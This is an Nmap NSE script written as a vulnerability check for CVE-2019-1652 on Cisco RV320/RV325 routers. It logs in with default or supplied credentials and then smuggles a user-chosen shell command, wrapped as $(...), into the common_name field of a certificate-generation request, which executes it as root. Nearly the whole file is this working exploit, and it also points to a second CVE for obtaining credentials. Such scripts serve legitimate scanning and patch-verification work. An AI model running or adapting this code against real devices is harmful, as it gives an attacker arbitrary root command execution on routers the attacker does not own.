local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local base64 = require "base64"
local openssl = stdnse.silent_require("openssl")

description = [[
A remote code execution vulnerability exists in the web-based management interface of Cisco RV320
and RV325 routers, which allows an authenticated user to execute arbitrary commands on the underlying
Linux shell as root by sending malicious HTTP POST requests to the web-based management interface.

The authentication credentials can be obtained exploiting CVE-2019-1653 on these devices.

References:
* https://nvd.nist.gov/vuln/detail/CVE-2019-1652
]]

---
-- @usage nmap -sV --script http-vuln-cve2019-1652 --script-args user='cisco',pwd='cisco',cmd='id',scheme='https' <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 443/tcp open  https   syn-ack
-- | http-vuln-cve2019-1652:
-- |   VULNERABLE:
-- |   Remote Code Execution in Cisco RV320 and RV325 Dual Gigabit WAN VPN Routers (CVE-2019-1652)
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2019-1652
-- |       A remote code execution vulnerability exists in the web-based management interface of Cisco RV320
-- |       and RV325 routers, which allows an authenticated user to execute arbitrary commands on the underlying
-- |       Linux shell as root by sending malicious HTTP POST requests to the web-based management interface.
-- |
-- |     Disclosure date: 2019-01-23
-- |     References:
-- |_      https://nvd.nist.gov/vuln/detail/CVE-2019-1652
-- @args http-vuln-cve2019-1652.user The user to use in request.
-- @args http-vuln-cve2019-1652.pwd The user's password.
-- @args http-vuln-cve2019-1652.user The command to execute.
-- @args http-vuln-cve2019-1652.scheme The supported scheme by the remote device.
---

author = {"Kostas Milonas"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}

portrule = shortport.http

local function get_auth_key(host, port, uri)
  -- make request to get the auth key
  local response = http.get(host, port, uri)
  if not response.body then
    return nil
  end

  -- parse response to get the auth key
  local auth_key = response.body:match('"auth_key" value="(.-)">')
  if not auth_key or auth_key == '' then
    stdnse.debug1('Auth key could not be found, using default.')
    auth_key = '1964300002'
  end

  return auth_key
end

local function url_encode(str)
   if str then
      str = str:gsub("\n", "\r\n")
      str = str:gsub("([^%w %-%_%.%~])", function(c)
         return ("%%%02X"):format(string.byte(c))
      end)
      str = str:gsub(" ", "+")
   end
   return str
end

action = function(host, port)
  local user = stdnse.get_script_args(SCRIPT_NAME .. '.user') or 'cisco'
  local pwd = stdnse.get_script_args(SCRIPT_NAME .. '.pwd') or 'cisco'
  local cmd = stdnse.get_script_args(SCRIPT_NAME .. '.cmd') or 'id'
  local scheme = stdnse.get_script_args(SCRIPT_NAME .. '.scheme') or 'https'
  local uri = '/'
  local url = scheme .. '://' .. host.ip .. ':' .. port.number .. uri
  
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln = {
    title = 'Remote Code Execution in Cisco RV320 and RV325 Dual Gigabit WAN VPN Routers (CVE-2019-1652)',
    state = vulns.STATE.NOT_VULN,
    description = [[
A remote code execution vulnerability exists in the web-based management interface of Cisco RV320
and RV325 routers, which allows an authenticated user to execute arbitrary commands on the underlying
Linux shell as root by sending malicious HTTP POST requests to the web-based management interface.
    ]],
    IDS = {CVE = 'CVE-2019-1652'},
    references = {
      'https://nvd.nist.gov/vuln/detail/CVE-2019-1652'
    },
    dates = {
      disclosure = {year = '2019', month = '01', day = '23'},
    }
  }

  -- make request to get the auth key
  local auth_key = get_auth_key(host, port, uri)
  if not auth_key then
    return vuln_report:make_output(vuln)
  end
  stdnse.debug1('Using auth key: %s', auth_key)

  -- prepare the credentials for login
  password_hash_plain = pwd .. auth_key
  password_hash = stdnse.tohex(openssl.md5(password_hash_plain))
  auth_server_pw = base64.enc(pwd)

  -- prepare data for login request
  local data = 'username=' .. user .. '&submitStatus=0&langName=ENGLISH%2CDeutsch%2CEspanol%2CFrancais%2CItaliano&auth_key=' .. auth_key .. '&password_expired=0&changelanguage=&new_password=&portalname=CommonPortal&auth_server_pw=' .. auth_server_pw .. '&current_password=&md5_old_pass=&re_new_password=&login=true&password=' .. password_hash .. '&pdStrength=0&LanguageList=ENGLISH'
  local headers = {['Content-Type'] = 'application/x-www-form-urlencoded'}
  -- make request to get the auth key
  local response = http.post(host, port, uri .. 'cgi-bin/userLogin.cgi', { header = headers }, { redirect_ok = false }, data)
  -- parse the redirection body to check if login failed
  if not response.body or not string.find(response.body, 'URL=/default.htm') then
    stdnse.debug1('Login failed.')
    return vuln_report:make_output(vuln)
  end
  stdnse.debug1('Login successful!')

  -- prepare data for request to execute the cmd
  data = 'SelectSubject_c=1&submitStatus=1&locality=A&Country=A&valid_days=30&organization_unit=A&KeyLength=1024&log_ch=1&email=ab%2540example.com&SelectSubject_s=1&OpenVPNRules=30&state=A&totalRules=1&common_name=a%27%24%28' .. url_encode(cmd) .. '%29%27b&organization=A&type=4&page=self_generator.htm&KeySize=512'
  headers = {['Content-Type'] = 'application/x-www-form-urlencoded', ['Cookie'] = response.cookies[1].name .. '=' .. response.cookies[1].value}
  -- make request to execute the command
  local response = http.post(host, port, uri .. 'certificate_handle2.htm?type=4', { header = headers }, { redirect_ok = true }, data)
  if response.status and response.body then
    -- check if response contains the identifier of the success page
    if response.status == 200 and string.find(response.body, 'url=/trusted_openvpn_cert.htm')then
      vuln.state = vulns.STATE.VULN
    else
      stdnse.debug1('Command execution failed.')
    end
  end

  return vuln_report:make_output(vuln)
end
